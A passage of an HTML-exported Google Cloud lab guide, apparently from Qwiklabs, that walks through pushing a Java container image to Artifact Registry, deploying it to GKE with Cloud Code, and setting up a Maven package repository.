credentials, Docker can be configured to use your </span><code>gcloud</code><span> credentials seamlessly.</span></p><ol start='' ><li><p><span>From Cloud Shell run the following command to configure Docker to use the Google Cloud CLI to authenticate requests to Artifact Registry in the </span><code>us-east1</code><span> region:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth configure-docker us-east1-docker.pkg.dev</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>The command will prompt for a confirmation to change the Cloud Shell docker configuration, click </span><strong><span>ENTER</span></strong><span>.</span></p></li></ol><h3 id='explore-the-sample-application'><span>Explore the sample Application</span></h3><p><span>A sample application is provided in the git repository you cloned.</span></p><ul><li><p><span>Change into the java directory and review the application code:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd ~/cloud-code-samples/java/java-hello-world</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The folder contains an example Java application that renders a simple web page: in addition to various files not relevant for this specific lab, it contains the source code, under the </span><code>src</code><span> folder, and a Dockerfile you will use to build a container image locally.</span></p><h3 id='build-the-container-image'><span>Build the Container Image</span></h3><p><span>Before you can store container images in Artifact Registry you need to create one.</span></p><ul><li><p><span>Run the following command to build the container image and tag it properly:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">docker build -t us-east1-docker.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-repo/java-hello-world:tag1 .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='push-the-container-image-to-artifact-registry'><span>Push the Container Image to Artifact Registry</span></h3><ul><li><p><span>Run the following command to push the container image to the repository you created:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">docker push us-east1-docker.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-repo/java-hello-world:tag1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='review-the-image-in-artifact-registry'><span>Review the image in Artifact Registry</span></h3><ol start='' ><li><p><span>In </span><strong><span>Artifact Registry &gt; Repositories</span></strong><span>, click into </span><code>container-dev-repo</code><span> and check that the </span><code>java-hello-world</code><span> image is there.</span></p></li><li><p><span>Click on the image and note the image tagged </span><code>tag1</code><span>. You can see that Vulnerability Scanning is running or already completed and the number of vulnerabilities detected is visible.</span></p></li></ol><p><img src="images\Fs3OTdcz9Ze%2F2ejwzgSPgbluaLT3YVESJWDQElxHwPU%3D" referrerpolicy="no-referrer" alt="Artifact Registry"></p><p><span>Click on the number of vulnerabilities and you will see the list of vulnerabilities detected in the image, with the CVE bulletin name and the severity. Click </span><strong><span>VIEW</span></strong><span> on each listed vulnerability to get more details:</span></p><p><img src="images\V6XVnPOuIjzX5496btWIthHrhmdCQcT998mk7Vg7PBg%3D" referrerpolicy="no-referrer" alt="CVE Readout"></p><h2 id='task-3-integration-with-cloud-code'><span>Task 3. Integration with Cloud Code</span></h2><p><span>In this section you use the Artifact Registry Docker image repository with </span><a href='https://cloud.google.com/code'><span>Cloud Code</span></a><span>.</span></p><h3 id='deploy-the-application-to-gke-cluster-from-cloud-code'><span>Deploy the Application to GKE Cluster from Cloud Code</span></h3><ol start='' ><li><p><span>From the </span><code>java-hello-world</code><span> folder run the following command to open Cloud Shell Editor and add the application folder to this workspace:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd ~/cloud-code-samples/</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cloudshell workspace .</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The Cloud Shell editor will open with the explorer in the application folder.</span></p><ol start='' ><li><p><span>From the left menu, select </span><strong><span>Cloud Code</span></strong><span> and then expand the </span><strong><span>COMPUTE ENGINE</span></strong><span> option and click on </span><strong><span>Select a Project</span></strong><span> and choose the project ID provided in the Lab Instruction.</span></p></li></ol><p><img src="images\uBkx5YV0EHDtJ2ZacT%2BaRfjw4UhzQlNrDEXOZN1CzN8%3D" referrerpolicy="no-referrer" alt="Cloud Code select Project"></p><p><span>Also, expand the </span><strong><span>KUBERNETES</span></strong><span> option. You will be able to see the cluster loading.</span></p><p><span>Wait until you see the cluster listed under </span><strong><span>KUBERNETES</span></strong><span> as well as under </span><strong><span>COMPUTE ENGINE</span></strong><span>.</span></p><ol start='' ><li><p><span>The following steps will require you to enter your Artifact Registry repository location. The format for the location is:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">us-east1-docker.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-repo</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Click </span><strong><span>Navigation menu</span></strong><span> under the Cloud Shell Editor</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="navigation menu icon"><span> </span><strong><span>View &gt; Command Palette...</span></strong><span> and type </span><strong><span>Run on Kubernetes</span></strong><span> and select </span><strong><span>Cloud Code: Run on Kubernetes</span></strong><span>.</span></p><p><img src="images\5TNFJonK0%2F34Ptdn2bm1%2BLuv2MuSOEwPOglqWOdVJF8%3D" referrerpolicy="no-referrer" alt="Cloud Code Status"></p><ol start='' ><li><p><span>Choose </span><strong><span>cloud-code-samples/java/java-hello-world/skaffold.yaml</span></strong><span> and then </span><strong><span>dockerfile</span></strong><span>.</span></p></li><li><p><span>If Prompted for a context, select </span><strong><span>Yes</span></strong><span> to use the current context.</span></p></li><li><p><span>In the prompt for the image registry select </span><strong><span>Enter the address of an image repository</span></strong><span> and put the address location you located below and press </span><strong><span>Enter</span></strong><span>.</span></p></li></ol><p><img src="images\HUPQfy2YJyirTxggCIvJ03afLMwqC3LJyMkoWznkMhI%3D" referrerpolicy="no-referrer" alt="Cloud Code Select Image Repository"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">us-east1-docker.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-repo</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>When you execute </span><strong><span>Run on Kubernetes</span></strong><span> for the first time Cloud Code prompts you for the target image repository location. Once provided, the repository url is stored in the file </span><code>.vscode/launch.json</code><span> which is created in the application folder.</span></p></li></ol><p><span>In the output pane you see that the build starts for the application image </span><code>java-hello-world,</code><span> the image is uploaded to the Artifact Registry repository configured previously.</span></p><ol start='' ><li><p><span>In </span><strong><span>Artifact Registry &gt; Repositories</span></strong><span> click into </span><code>container-dev-repo</code><span> and check that the </span><code>java-hello-world</code><span> image and note a new image tagged </span><code>latest</code><span>.</span></p></li></ol><h3 id='review-the-deployed-application'><span>Review the Deployed Application</span></h3><ol start='' ><li><p><span>Go back to Cloud Shell Editor. When deployment is complete Skaffold/Cloud Code will print the exposed url where the service have been forwarded, click on the link - </span><strong><span>Follow link</span></strong><span>:</span></p></li></ol><p><img src="images\WqbdqnbpEwsfVgkxNO238fzw538d%2F%2BdUHX3SZoKVA7Y%3D" referrerpolicy="no-referrer" alt="URL Location"></p><p><span>In the new browser window you see the hello world app page.</span></p><p><img src="images\EhYbCuh0BXpEitT%2BxC%2FwvcIdTfqZCTwDYA03NV9Y%2FIE%3D" referrerpolicy="no-referrer" alt="Hello World"></p><h3 id='update-application-code'><span>Update application code</span></h3><p><span>Now update the application to see the change implemented immediately in the deployment on the cluster:</span></p><ol start='' ><li><p><span>Open the </span><code>HelloWorldController.java</code><span> by clicking on the </span><strong><span>Navigation menu</span></strong><span> under the Cloud Shell Editor </span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="navigation menu icon"><span> </span><strong><span>View &gt; Command Palette...</span></strong><span> and then click one backspace and then enter the path </span><strong><span>src/main/java/cloudcode/helloworld/web</span></strong><span> and click the option starting with </span><code>Hello..</code><span> .</span></p></li><li><p><span>Change the text in row 20 from &quot;It&#39;s running!&quot; to &quot;It&#39;s updated!&quot;. You should see the build and deployment process starting immediately.</span></p></li><li><p><span>At the end of the deploy click again on the forwarded url or refresh the browser window with the application to see your change deployed:</span></p></li></ol><p><img src="images\9MMRZmhhziw4WEb3SYlfGzSKCvV4YE0EvqQGXdqwerw%3D" referrerpolicy="no-referrer" alt="Hello World Updated"></p><ol start='' ><li><p><span>In the Cloud console go to </span><strong><span>Navigation Menu &gt; Artifact Registry &gt; Repositories</span></strong><span> and click into </span><code>container-dev-repo</code><span> to check that the </span><code>java-hello-world</code><span> image and note the new image.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Integration with Cloud Code</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-4-working-with-language-packages'><span>Task 4. Working with language packages</span></h2><p><span>In this section you will set up an Artifact Registry Java repository and upload packages to it, leveraging them in different applications.</span></p><h3 id='create-a-java-package-repository'><span>Create a Java package repository</span></h3><ol start='' ><li><p><span>From Cloud Shell run the following command to create a repository for Java artifacts:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud artifacts repositories create container-dev-java-repo \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --repository-format=maven \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --location=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --description="Java package repository for Container Dev Workshop"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click Authorize if the Cloud Shell authorization prompt appears</span></p></li><li><p><span>In the Cloud console go to </span><strong><span>Artifact Registry &gt; Repositories</span></strong><span> and notice your newly created Maven repository named </span><code>container-dev-java-repo</code><span>, if you click on it you can see that it&#39;s empty at the moment.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create a Java package repository</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='set-up-authentication-to-artifact-repository'><span>Set up authentication to Artifact Repository</span></h3><ul><li><p><span>Use the following command to update the well-known location for Application Default Credentials (ADC) with your user account credentials so that the Artifact Registry credential helper can authenticate using them when connecting with repositories:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth login --update-adc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If prompted to authenticate:</span></p><ul><li><p><span>Choose </span><strong><span>Y</span></strong><span>.</span></p></li><li><p><span>Paste the code into a browser window.</span></p></li><li><p><span>Select Google Sign In and sign in using the credentials in the lab.</span></p></li><li><p><span>Copy the authentication code from the browser back into the console to complete the authentication.</span></p></li></ul><h3 id='configure-maven-for-artifact-registry'><span>Configure Maven for Artifact Registry</span></h3><ol start='' ><li><p><span>Run the following command to print the repository configuration to add to your Java project:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud artifacts print-settings mvn \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --repository=container-dev-java-repo \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --location=us-east1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Open the </span><code>pom.xml</code><span> in Cloud Shell Editor and add the returned settings to the appropriate sections in the file:</span></p></li></ol><ul><li><p><span>Add the </span><strong><span>distributionManagement</span></strong><span> section.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  &lt;distributionManagement&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  &lt;snapshotRepository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  &lt;/snapshotRepository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  &lt;repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  &lt;id&gt;artifact-registry&lt;/id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  &lt;url&gt;artifactregistry://us-east1-maven.pkg.dev/qwiklabs-gcp-04-21a41c4e5c02/container-dev-java-repo&lt;/url&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  &lt;/repository&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  &lt;/distributionManagement&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><ul><li><p><span>Add the </span><strong><span>repositories</span></strong><span> section.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" 